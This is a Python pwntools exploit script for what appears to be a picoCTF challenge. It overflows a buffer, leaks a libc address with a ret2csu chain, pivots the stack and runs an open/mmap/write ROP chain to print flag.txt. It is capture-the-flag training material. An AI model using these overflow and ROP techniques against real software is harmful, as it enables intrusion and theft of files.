from pwn import *

context.arch = 'amd64'
context.os = 'linux'

r = remote('mars.picoctf.net', 31809)
elf = ELF('./horse')
got_read = elf.got['read']
got_write = elf.got['write']

csu_pop = 0x400bfa 
csu_call = 0x400be0

def leak_read():
    payload = b'A' * 32
    payload += b'B' * 8 
    payload += p64(csu_pop)
    payload += p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_read) + p64(8)
    payload += p64(csu_call)
    payload += b'J' * 8 
    payload += b'K' * 48 # pops
    payload += p64(elf.symbols['main']) # Return to main

    log.info("Sending leak payload...")
    r.sendline(payload)
    
    r.recvuntil(b'/     /   \xc2\xb4\n')
    
    try:
        leaked_data = r.recvn(8)
        leaked_read = u64(leaked_data)
        log.success(f"Leaked read@GLIBC: {hex(leaked_read)}")
        return leaked_read
    except Exception as e:
        log.error(f"Failed to receive leak: {e}")
        exit()

leaked_read = leak_read()

# Offsets 9.18
off_read_918 = 0x10e1e0
off_open_918 = 0x10df00
off_mmap_918 = 0x118ae0
off_write_918 = 0x10e280
off_pop_rdi_918 = 0x23b6a
off_pop_rsi_918 = 0x2601f
off_pop_rdx_r12_918 = 0x119431
off_pop_rcx_rbx_918 = 0x10257e
off_mov_r8_rax_918 = 0x153518
off_pop_rsp_918 = 0x3ae0

def get_addr(offset_918):
    return leaked_read + (offset_918 - off_read_918)

addr_open = get_addr(off_open_918)
addr_mmap = get_addr(off_mmap_918)
addr_write = get_addr(off_write_918)
addr_read = get_addr(off_read_918)
gadget_pop_rdi = get_addr(off_pop_rdi_918)
gadget_pop_rsi = get_addr(off_pop_rsi_918)
gadget_pop_rdx = get_addr(off_pop_rdx_r12_918)
gadget_pop_rcx = get_addr(off_pop_rcx_rbx_918)
gadget_mov_r8_rax = get_addr(off_mov_r8_rax_918)
gadget_pop_rsp = get_addr(off_pop_rsp_918)

# Stage 2 Payload (Pivot Stack)
# We are back in main. main calls read. Buffer at rbp-0x20.
# We overwrite ret address.
heap_stack = 0x602800

payload2 = b'A' * 32
payload2 += b'B' * 8 

# ROP to read chain to heap and pivot
# read(0, heap_stack, 0x500)
payload2 += p64(gadget_pop_rdi) + p64(0)
payload2 += p64(gadget_pop_rsi) + p64(heap_stack)
payload2 += p64(gadget_pop_rdx) + p64(0x500) + p64(0)
payload2 += p64(addr_read)

# pop rsp -> heap_stack
payload2 += p64(gadget_pop_rsp) + p64(heap_stack)

log.info("Sending Stack Pivot payload...")
r.sendline(payload2)

# Consume horse output (main runs horse again)
r.recvuntil(b'/     /   \xc2\xb4\n')

# Stage 3 Payload (Actual ORW)
# This will be read into heap_stack and executed.
payload3 = b''

# flag string at heap_stack + 0x400 (safe area)
flag_str_loc = heap_stack + 0x400
# We need to send "flag.txt" at the end of this payload

# 1. open(flag_str_loc, 0)
payload3 += p64(gadget_pop_rdi) + p64(flag_str_loc)
payload3 += p64(gadget_pop_rsi) + p64(0)
payload3 += p64(addr_open)

# 2. mov r8, rax
payload3 += p64(gadget_mov_r8_rax) + p64(0) 

# 3. mmap(0x603000, 0x100, 3, 0x12, r8, 0)
payload3 += p64(gadget_pop_rdi) + p64(0x603000)
payload3 += p64(gadget_pop_rsi) + p64(0x100)
payload3 += p64(gadget_pop_rdx) + p64(3) + p64(0)
payload3 += p64(gadget_pop_rcx) + p64(0x12) + p64(0)
payload3 += p64(addr_mmap)

# 4. write(1, 0x603000, 0x100)
payload3 += p64(gadget_pop_rdi) + p64(1)
payload3 += p64(gadget_pop_rsi) + p64(0x603000)
payload3 += p64(gadget_pop_rdx) + p64(0x100) + p64(0)
payload3 += p64(addr_write)

# Padding until flag string
payload3 = payload3.ljust(0x400, b'\x90')
payload3 += b'flag.txt\x00'

log.info("Sending Final ROP payload...")
time.sleep(0.5)
r.sendline(payload3)

r.interactive()
